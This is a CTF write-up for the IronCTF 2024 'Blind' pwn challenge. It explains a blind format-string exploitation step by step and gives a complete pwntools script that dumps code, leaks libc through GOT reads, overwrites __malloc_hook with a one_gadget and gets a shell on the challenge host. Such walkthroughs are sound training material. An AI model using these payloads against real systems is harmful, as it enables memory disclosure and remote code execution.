---
title: IronCTF 2024 - Blind
date: 2024-10-9
categories: [CTF, writeup]
tags: [ctf, writeup, ironctf]     # TAG names should always be lowercase
---

<center><h1>IronCTF 2024 - Blind</h1></center>

- **Category:** Pwn.  
- **Points:** 500
- **Solves:** 4  
- **Author:** Vigneswar  
  
   
This weekend, I participated in Iron CTF 2024. Unfortunately, due to last-minute personal issues, I couldn't dedicate much time to it. However, there were some great challenges, and as always, I focused on the PWN category. One challenge I couldn’t finish in time caught my interest, so I decided to complete it later. Here, I will explain how I solved it.    
  
## Description  
The challenge description says: "*Seriously?! Is blind pwn even possible? Only one way to find out :)*"  
This time we have neither code nor any files that we can decompile. We only have a host and a port to connect to. When we connect, we receive a prompt where we can write whatever we want in an infinite loop until some timeout ends the process.  
The objective is clear. As the name of the challenge suggests, we need to carry out a blind exploitation.  

## First Steps
My first step was to find the bug. The first thing that came to mind was to try to trigger a buffer overflow by entering a long string. However, it seems that this was not the case. Next, I checked for a potential format string vulnerability.  
```
➜  CTFs nc pwn.1nf1n1ty.team 32739
Its too dark here...
>>> %p.%p.%p.%p
0x7fffa8637bc0.0x3e8.0x7fb065a5d031.0x4
```
Bingo!!! The vulnerability exists! Knowing that the program is vulnerable to format strings, I created the following function to dump what’s on the stack to see if I could find something interesting.  
```py
def dump_format(start, end):
    p = remote(HOST, PORT)
    payload  = ''
    for i in range(start, end):
        payload += f'{i}=%{i}$p\n'    
    p.sendlineafter(b'>>> ', payload)
    print(p.recvuntil(b'>>> ').decode())
    p.close()
```
```
125=(nil)
126=(nil)
127=(nil)
128=(nil)
129=(nil)
130=(nil)
131=0x18d48647e059c200
132=0x400760
133=0x7fa6ed702c87
134=0x1
135=0x7ffeb87ddae8
136=0x100008000
137=0x4006ca
```
There, something interesting is already visible. At offset 131, there is clearly what appears to be a stack canary. From this, I deduce that offset 132 will be RBP and then offset 133 will be the return address of the function, probably `__libc_start_main + (unknown offset)`. You can also see several addresses that seem to belong to the .text section of the file, such as those at offsets 132 and 137. These addresses also indicate that the file is not protected by PIE. And the address at offset 135 is probably a stack address. I haven't found anything in the stack that resembles what could be a flag.  

## The Plan
My plan will be as follows. I will try to dump the program’s code using format strings. This will allow me, in addition to understanding what I'm facing, to see if there’s a win function. If there isn't a win function, I will try to obtain a leak from libc to determine which version of GLIBC is being used, allowing me to use the necessary gadgets from there. Depending on what I obtain, I will decide how to proceed.  
I make use of the following function to try to dump what is in the range from address 0x400000 to 0x401000.  
To do this, this function uses the format string %7$s to dereference what is in addr. If I receive an empty string, I assume it is a NULL byte; otherwise, I take the first byte and increment addr by 1. Since the server has a timeout, a new connection must be made when the current one closes.  
```py
def read_addr(p, addr):
    payload  = b'%7$s\x00\x00\x00\x00'
    payload += p64(addr)
    p.sendline(payload)
    return p.recvuntil(b'>>> ')[:-4]

def leak_section(start_addr, size):
    code = b''
    idx = 0
    print(f"[i] Leaking Section {hex(start_addr)} - {hex(start_addr+size)}")
    while(len(code) < size):
        try:
            res = read_addr(p, start_addr + idx)
            if (res == b''):
                code += b'\x00'
            else:
                code += res[0:1]
            idx += 1
        except:
            p = remote(HOST, PORT)
            p.recvuntil(b'>>> ')
            print("[i] ADDR:", hex(start_addr+idx))
    return code

def dump_qwords(buff):
    for q in range(0, len(buff), 8):
        qword = u64(buff[q:q+8])
        print(f"{hex(q)}\t{hex(qword)}\n")

code = leak_section(0x400000, 0x1000)
print(disasm(code))
```
And here is the most interesting part. The program code:  
```
     687:       55                      push   rbp
     688:       48 89 e5                mov    rbp, rsp
     68b:       48 8b 05 8e 09 20 00    mov    rax, QWORD PTR [rip+0x20098e]        # 0x201020
     692:       b9 00 00 00 00          mov    ecx, 0x0
     697:       ba 02 00 00 00          mov    edx, 0x2
     69c:       be 00 00 00 00          mov    esi, 0x0
     6a1:       48 89 c7                mov    rdi, rax
     6a4:       e8 e7 fe ff ff          call   0x590
     6a9:       48 8b 05 60 09 20 00    mov    rax, QWORD PTR [rip+0x200960]        # 0x201010
     6b0:       b9 00 00 00 00          mov    ecx, 0x0
     6b5:       ba 02 00 00 00          mov    edx, 0x2
     6ba:       be 00 00 00 00          mov    esi, 0x0
     6bf:       48 89 c7                mov    rdi, rax
     6c2:       e8 c9 fe ff ff          call   0x590
     6c7:       90                      nop
     6c8:       5d                      pop    rbp
     6c9:       c3                      ret
     6ca:       55                      push   rbp
     6cb:       48 89 e5                mov    rbp, rsp
     6ce:       48 81 ec f0 03 00 00    sub    rsp, 0x3f0
     6d5:       64 48 8b 04 25 28 00 00 00      mov    rax, QWORD PTR fs:0x28
     6de:       48 89 45 f8             mov    QWORD PTR [rbp-0x8], rax
     6e2:       31 c0                   xor    eax, eax
     6e4:       b8 00 00 00 00          mov    eax, 0x0
     6e9:       e8 99 ff ff ff          call   0x687
     6ee:       48 8d 3d ef 00 00 00    lea    rdi, [rip+0xef]        # 0x7e4
     6f5:       e8 56 fe ff ff          call   0x550
     6fa:       48 8d 85 10 fc ff ff    lea    rax, [rbp-0x3f0]
     701:       ba e8 03 00 00          mov    edx, 0x3e8
     706:       be 00 00 00 00          mov    esi, 0x0
     70b:       48 89 c7                mov    rdi, rax
     70e:       e8 5d fe ff ff          call   0x570
     713:       48 8d 3d df 00 00 00    lea    rdi, [rip+0xdf]        # 0x7f9
     71a:       b8 00 00 00 00          mov    eax, 0x0
     71f:       e8 3c fe ff ff          call   0x560
     724:       48 8d 85 10 fc ff ff    lea    rax, [rbp-0x3f0]
     72b:       ba e8 03 00 00          mov    edx, 0x3e8
     730:       48 89 c6                mov    rsi, rax
     733:       bf 00 00 00 00          mov    edi, 0x0
     738:       e8 43 fe ff ff          call   0x580
     73d:       48 8d 85 10 fc ff ff    lea    rax, [rbp-0x3f0]
     744:       48 89 c7                mov    rdi, rax
     747:       b8 00 00 00 00          mov    eax, 0x0
     74c:       e8 0f fe ff ff          call   0x560
     751:       eb c0                   jmp    0x713
```

A very typical program in CTFs. First, stdin and stdout are set as unbuffered, something is printed, and 0x3e8 bytes are read into the stack. This repeats in a loop until the server closes. There's no buffer overflow or win function.  

## Leaking Libc
I need to know which version of GLIBC is being used, as well as its base address. For that, I need at least the leak of two known addresses from libc. I'm going to try to read them from the GOT section.  
I know this part is the call to printf:  
```asm
73d:       48 8d 85 10 fc ff ff    lea    rax, [rbp-0x3f0]
744:       48 89 c7                mov    rdi, rax
747:       b8 00 00 00 00          mov    eax, 0x0
74c:       e8 0f fe ff ff          call   0x560
```
Therefore, at offset 0x560 will be the printf PLT. 
```asm
560:       ff 25 6a 0a 20 00       jmp    QWORD PTR [rip+0x200a6a]        # 0x200fd0
566:       68 01 00 00 00          push   0x1
56b:       e9 d0 ff ff ff          jmp    0x540    
```
So at address 0x400000 + 0x200fd0, there will be printf GOT.  
With this function I have an arbitrary read and I can read printf GOT:  
```py
def arb_read(addr):
    content = b''
    for i in range(8):
        payload  = b'%7$s\x00\x00\x00\x00'
        payload += p64(addr + i)
        p.sendline(payload)
        leaked_byte = p.recvuntil(b'>>> ')[:-4]
        if leaked_byte == b'':
            content += b'\x00'
        else:
            content += leaked_byte[0:1]
    return u64(content)
```
Doing the same with another function, such as read, I obtain two known addresses from libc. Then, with a libc database like this one https://libc.rip/, I can determine that GLIBC 2.27 is being used, exactly the same version as in the challenge of this CTF called SimpleNotes. Therefore, from here, I will use that same libc. This also allows me to compute the libc base.  

## Exploitation
For the exploitation, I will take advantage of the fact that the version of GLIBC is a bit old and malloc hooks can still be used. I will write the address of *one_gadget* to *__malloc_hook*, and when I call malloc, I should get a shell.  
```py
# Overwriting malloc_hook with one_gadget
one_gadget = libc.address + 0x10a2fc
malloc_hook = libc.sym.__malloc_hook

write  = {malloc_hook : one_gadget}
payload  = fmtstr_payload(6, write, write_size='short')
p.sendline(payload)
```
Finally, I just need to call malloc so that it executes *one_gadget*. But how do I call malloc if malloc is not used in the code?  
As explained in the following [post](https://ir0nstone.gitbook.io/notes/binexp/stack/one-gadgets-and-malloc-hook), when printf is called with a sufficiently large amount of bytes, it internally calls malloc. 
```py
# Force call malloc.
payload = b'%100000c'
p.sendlineafter(b'>>>', payload)
```
And with this, I finally get a shell and the flag.  
```
➜  blind ./exploit.py
[*] '/home/elchals/CTFs/IronCTF/blind/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to pwn.1nf1n1ty.team on port 32739: Done
[i] Printf GOT: 0x7fc225735e40
[i] Read GOT: 0x7fc2257e1020
[i] Libc Base: 0x7fc2256d1000
[*] Switching to interactive mode
 $ ls
flag.txt
ld-linux-x86-64.so.2
libc.so.6
run
$ cat flag.txt
ironCTF{Haha_You_Found_me_b1ind}
```

## Final Code
```py
#!/bin/python3
from pwn import *

context.log_level = 'INFO'
context.terminal = ['remotinator', 'vsplit', '-x']
context.arch = 'amd64'

######################################################################################

HOST = "pwn.1nf1n1ty.team"
PORT = 32739

libc = ELF('./libc.so.6')

######################################################################################

def dump_format(start, end):
    p = remote(HOST, PORT)
    payload  = ''
    for i in range(start, end):
        payload += f'{i}=%{i}$p\n'    
    p.sendlineafter(b'>>> ', payload)
    print(p.recvuntil(b'>>> ').decode())
    p.close()

def read_addr(p, addr):
    payload  = b'%7$s\x00\x00\x00\x00'
    payload += p64(addr)
    p.sendline(payload)
    return p.recvuntil(b'>>> ')[:-4]

def leak_section(start_addr, size):
    code = b''
    idx = 0
    print(f"[i] Leaking Section {hex(start_addr)} - {hex(start_addr+size)}")
    while(len(code) < size):
        try:
            res = read_addr(p, start_addr + idx)
            #print(code)
            if (res == b''):
                code += b'\x00'
            else:
                code += res[0:1]
            idx += 1
        except:
            p = remote(HOST, PORT)
            p.recvuntil(b'>>> ')
            print("[i] ADDR:", hex(start_addr+idx))
    return code

def arb_read(addr):
    content = b''
    for i in range(8):
        payload  = b'%7$s\x00\x00\x00\x00'
        payload += p64(addr + i)
        p.sendline(payload)
        leaked_byte = p.recvuntil(b'>>> ')[:-4]
        if leaked_byte == b'':
            content += b'\x00'
        else:
            content += leaked_byte[0:1]
    return u64(content)


######################################################################################

# Dump Stack content
#dump_format(100, 150)

#code = leak_section(0x400000, 0x1000)
#print(disasm(code))

# Leaking Libc Base address
p = remote(HOST, PORT)
p.recvuntil(b'>>> ')

printf_got = arb_read(0x400000 + 0x200fd0)
print("[i] Printf GOT:", hex(printf_got))

read_got = arb_read(0x400000 + 0x200fe0)
print("[i] Read GOT:", hex(read_got))

libc.address = printf_got - libc.sym.printf
print("[i] Libc Base:", hex(libc.address))

# Overwriting malloc_hook with one_gadget
one_gadget = libc.address + 0x10a2fc
malloc_hook = libc.sym.__malloc_hook

write  = {malloc_hook : one_gadget}
payload  = fmtstr_payload(6, write, write_size='short')
p.sendline(payload)

# Force call malloc.
payload = b'%100000c'
p.sendlineafter(b'>>>', payload)

p.interactive()
```
## References
- One Gadgets and Malloc Hook: https://ir0nstone.gitbook.io/notes/binexp/stack/one-gadgets-and-malloc-hook  
